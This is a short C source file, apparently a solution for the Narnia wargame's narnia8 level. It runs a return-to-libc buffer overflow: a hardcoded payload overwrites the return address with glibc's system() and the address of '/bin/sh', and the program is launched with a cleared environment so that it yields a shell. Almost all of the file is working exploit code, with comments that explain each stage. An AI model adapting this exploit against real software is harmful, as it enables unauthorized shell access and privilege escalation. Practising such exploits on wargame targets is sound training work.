//Wrapper file so env variables are clean in/out of gdb...
#include <unistd.h>

int main(void){
	//Buffer overflow, 1st address (0xffffdfbf) is to allow the payload to keep writing, as the buffer overflow cuts off 
	//the address being written from. (Basically its the address containing the payload string)
	//small buffer needed to reach return address, 4 bytes
	//Next address is glibc's system!
	//Then the stack is set up with 2 more addresses, 1 being the return address after system (needed)
	//the other is the arg for system, in this case the address of "/bin/sh" in glibc.
	char * payload = "AAAABBBBCCCCDDDDEEEE\xbf\xdf\xff\xff\\FFF\x50\xc8\xe4\xf7\x90\x84\x04\x08\xc8\xec\xf6\xf7"; 	
	//Wipe environment vars
	char **environ = NULL;
	//Get args for prog
	char *argv[3] = {"/narnia/narnia8", payload, 0};
	//Execute prog
	execve("/narnia/narnia8", argv, environ);
	//Upon running, you get a shell in the server!
}
